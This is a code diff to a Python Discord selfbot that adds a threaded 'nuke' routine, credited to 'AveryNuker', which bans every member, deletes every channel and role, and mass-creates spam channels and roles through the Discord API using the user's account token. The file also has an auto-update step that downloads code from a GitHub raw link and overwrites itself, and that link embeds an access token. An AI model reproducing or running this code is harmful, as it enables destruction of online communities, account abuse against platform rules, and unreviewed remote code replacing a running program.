@@ -7,30 +7,11 @@ import humanize
 import jstyleson
 import time
 import random
+import threading
 
 from string import ascii_letters as letters
-import requests as req
+import requests
 from discord.ext import commands
-
-# Constants
-DISCORD_LIMIT = 2000
-MAIN_CLR =  colorama.Fore.LIGHTMAGENTA_EX
-RESET = colorama.Style.RESET_ALL
-CLS = lambda: os.system("cls") if os.name == "nt" else "clear"
-
-def get_mention(id):
-    return f"<@!{id}>"
-
-def replace_mention(string, id, name):
-    return string.replace(get_mention(id), f"@{name}")
-
-# Format UTC time with humanize
-def format_time(time):
-    return humanize.naturaltime(time)
-
-if not os.path.exists("mentions.txt"):
-    with open("mentions.txt", "w") as f:
-        f.write("")
 
 if not os.path.exists("./config.jsonc"):
     with open("./config.jsonc", "w") as f:
@@ -48,6 +29,102 @@ if not os.path.exists("./config.jsonc"):
 with open("config.jsonc", "r") as f:
     config = jstyleson.loads(f.read())
 
+# Constants
+DISCORD_LIMIT = 2000
+MAIN_CLR =  colorama.Fore.LIGHTMAGENTA_EX
+RESET = colorama.Style.RESET_ALL
+CLS = lambda: os.system("cls") if os.name == "nt" else "clear"
+headers = {'Authorization': f'{config["token"]}'}
+
+def get_mention(id):
+    return f"<@!{id}>"
+
+def replace_mention(string, id, name):
+    return string.replace(get_mention(id), f"@{name}")
+
+# Format UTC time with humanize
+def format_time(time):
+    return humanize.naturaltime(time)
+
+def BanMembers(guild, member):
+    while True:
+        r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
+        if 'retry_after' in r.text:
+            time.sleep(r.json()['retry_after'])
+        else:
+            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
+                print(f"{MAIN_CLR}[{format_time(time.time())}] {member} has been banned from {guild}")
+                break
+            else:
+                break
+
+def DeleteChannels(guild, channel):
+        while True:
+            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
+            if 'retry_after' in r.text:
+                time.sleep(r.json()['retry_after'])
+            else:
+                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
+                    print(f"{MAIN_CLR}[{format_time(time.time())}] {channel} has been deleted from {guild}")
+                    break
+                else:
+                    break
+
+def DeleteRoles(guild, role):
+    while True:
+        r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
+        if 'retry_after' in r.text:
+            time.sleep(r.json()['retry_after'])
+        else:
+            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
+                print(f"{MAIN_CLR}[{format_time(time.time())}] {role} has been deleted from {guild}")
+                break
+            else:
+                break
+
+def SpamChannels(guild, name):
+    while True:
+        json = {'name': name, 'type': 0}
+        r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
+        if 'retry_after' in r.text:
+            time.sleep(r.json()['retry_after'])
+        else:
+            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
+                print(f"{MAIN_CLR}[{format_time(time.time())}] {name} has been created in {guild}")
+                break
+            else:
+                break
+
+def SpamRoles(guild, name):
+    while True:
+        json = {'name': name}
+        r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
+        if 'retry_after' in r.text:
+            time.sleep(r.json()['retry_after'])
+        else:
+            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
+                print(f"{MAIN_CLR}[{format_time(time.time())}] {name} has been created in {guild}")
+                break
+            else:
+                break
+
+async def NukeExecute(guild, channel_name, channel_amount, role_name, role_amount):
+    # From AveryNuker
+    for member in guild.members:
+        threading.Thread(target=BanMembers, args=(str(guild.id), str(member.id),)).start()
+    for channel in guild.channels:
+        threading.Thread(target=DeleteChannels, args=(str(guild.id), str(channel.id),)).start()
+    for role in guild.roles:
+        threading.Thread(target=DeleteRoles, args=(str(guild.id), str(role.id),)).start()
+    for i in range(int(channel_amount)):
+        threading.Thread(target=SpamChannels, args=(str(guild.id), str(channel_name),)).start()
+    for i in range(int(role_amount)):
+        threading.Thread(target=SpamRoles, args=(str(guild.id), str(role_name),)).start()
+
+if not os.path.exists("mentions.txt"):
+    with open("mentions.txt", "w") as f:
+        f.write("")
+
 __TOKEN__ = config["token"]
 __PREFIX__ = config["prefix"]
 __SELFBOT__ = config["selfbot"]
@@ -60,7 +137,7 @@ WRITE_MENTIONS = config["write_mentions"] # If True, all mentions will be saved 
 
 if __AUTOUPDATE__:
     link = "https://raw.githubusercontent.com/HACKERqq420/self/main/selfbot.py?token=GHSAT0AAAAAABRV3PT43C27XG36ST5WJQP6YQ7RQCQ"
-    body = req.get(link).text
+    body = requests.get(link).text
     with open(__file__, "w") as f:
         code = f.read()
     if code != body:
@@ -192,23 +269,24 @@ async def _userinfo(ctx, user: discord.User=None):
     await ctx.send("\n".join(res), delete_after=__DELETE_CMD_OUTPUT_AFTER__)
 
 @bot.command("nuke", help="Nukes a Server")
-async def _nuke(ctx):
-    for i in ctx.guild.members:
-        if not i.bot:
-            try:
-                await i.ban(reason="LOL")
-            except:
-                pass
-    for channel in ctx.guild.channels:
-        try:
-            await channel.delete()
-        except:
-            pass
-    for i in range(1, 10):
-        rand_text = "".join(random.choice(letters) for i in range(random.randint(10, 20)))
-        channel = await ctx.guild.create_text_channel(f"{rand_text}")
-        await channel.send(f"NUKED BY {str(ctx.author)}")
-    await ctx.guild.edit(name = "NUKED BY " + str(ctx.author), icon=None, banner=None, description=None, reason=None)
+async def _nuke(ctx, channel_name = "NUKE", channel_amount = 5, role_name = "NUKE", role_amount = 5):
+    await NukeExecute(ctx.guild, channel_name, channel_amount, role_name, role_amount)
+    # for i in ctx.guild.members:
+    #     if not i.bot:
+    #         try:
+    #             await i.ban(reason="LOL")
+    #         except:
+    #             pass
+    # for channel in ctx.guild.channels:
+    #     try:
+    #         await channel.delete()
+    #     except:
+    #         pass
+    # for i in range(1, 10):
+    #     rand_text = "".join(random.choice(letters) for i in range(random.randint(10, 20)))
+    #     channel = await ctx.guild.create_text_channel(f"{rand_text}")
+    #     await channel.send(f"NUKED BY {str(ctx.author)}")
+    # await ctx.guild.edit(name = "NUKED BY " + str(ctx.author), icon=None, banner=None, description=None, reason=None)
     # await ctx.send("Nuke complete", delete_after=__DELETE_CMD_OUTPUT_AFTER__)
 
 # @bot.command("spam", "Spams random text")
